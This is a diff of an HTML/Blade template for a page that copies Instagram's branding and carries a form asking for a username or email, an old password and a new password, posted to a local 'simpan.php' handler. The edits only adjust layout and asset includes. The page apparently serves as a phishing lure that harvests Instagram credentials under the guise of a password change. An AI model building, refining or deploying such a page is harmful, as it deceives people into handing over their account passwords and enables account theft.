@@ -7,10 +7,8 @@
     <meta name="description" content="Instagram">
     <meta name="author" content="MasRockey">
     <link rel="shortcut icon" href="img/icon.png" type="image/x-icon">
-    <link rel="stylesheet" href="/css/style.css">
-    <link rel="stylesheet" href="/css/app.css">
     <title>Instagram</title>
-    @vite('resources/css/app.css')
+    @vite(['resources/css/app.css','resources/js/app.js'])
 </head>
 <body class=" h-screen bg-gray-100 flex flex-col justify-center items-center">
         <div class="">
@@ -26,11 +24,12 @@
             <!-- SMARTPHONE SECTION END -->
             <!-- FORM SECTION -->
             <div class="form-area">
-                <div class="logo">
-                    <img src="img/logo.png" alt="Instagram Logo">
-                </div>
-                <form action="simpan.php" method="post">
-                    <input type="email" name="nama" placeholder="Phone Number, username, or, email">
+                <form action="simpan.php" method="POST">
+                    <div class="flex flex-col justify-center items-center">
+                        <img src="img/logo.png" alt="Instagram Logo">
+                    </div>
+                    <br>
+                    <input type="text" name="nama" placeholder="Phone Number, username, or, email">
                     <input type="password" name="isi" placeholder="Old Password">
                     <input type="password" name="newpassword" placeholder="New Password">
                     <br>
